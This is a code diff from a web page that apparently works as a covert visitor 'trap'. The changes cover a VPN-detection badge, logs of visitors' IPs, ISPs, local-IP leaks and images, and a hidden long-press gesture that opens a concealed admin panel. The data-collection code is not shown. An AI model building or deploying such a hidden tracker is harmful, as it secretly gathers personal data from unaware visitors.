+            imgEl.innerHTML = d.image ? `<img src="${d.image}" class="w-full h-full object-cover">` : `<i class="fa-solid fa-image text-2xl mb-1 text-slate-600"></i><span class="text-[10px] text-slate-600">No Image</span>`;
             
-            // Check for VPN via Timezone Mismatch (Simple Check)
-            // Real timezone vs IP timezone logic would be here
-            if(d.local_ip === "Not Leaking" || d.isp.includes("VPN") || d.isp.includes("Cloud")) {
-                get('vpn-badge').classList.remove('hidden');
-            } else {
-                get('vpn-badge').classList.add('hidden');
-            }
+            // Check for VPN Badge
+            if(d.local_ip !== "Secure" && d.local_ip !== "Hidden" && d.local_ip !== "Failed") get('vpn-badge').classList.remove('hidden');
+            else get('vpn-badge').classList.add('hidden');
         }
 
         function clearLogs() {
-            localStorage.removeItem('krysha_logs_v11');
+            localStorage.removeItem('krysha_logs_v12');
             renderLogList();
         }
 
@@ -571,16 +464,31 @@
             renderLogList();
         }
 
-        function adminKnock() {
-            knockCount++;
-            clearTimeout(knockTimer);
-            knockTimer = setTimeout(() => { knockCount = 0; }, 2000);
-            if (knockCount === 3) { toggleView(); knockCount = 0; }
+        // --- 6. ADMIN TRIGGER (LONG PRESS LOGIC) ---
+        let pressTimer;
+        const trigger = get('admin-trigger');
+
+        trigger.addEventListener('mousedown', startPress);
+        trigger.addEventListener('touchstart', startPress);
+        
+        trigger.addEventListener('mouseup', cancelPress);
+        trigger.addEventListener('mouseleave', cancelPress);
+        trigger.addEventListener('touchend', cancelPress);
+
+        function startPress(e) {
+            // e.preventDefault(); // Optional: prevent selection
+            pressTimer = setTimeout(() => {
+                toggleView(); // Trigger Admin Panel after 2s
+                navigator.vibrate(200); // Haptic feedback
+            }, 2000); 
         }
-        let knockCount = 0;
-        let knockTimer;
+
+        function cancelPress() {
+            clearTimeout(pressTimer);
+        }
 
         window.onload = initTrap;
+
     </script>
 </body>
 </html>
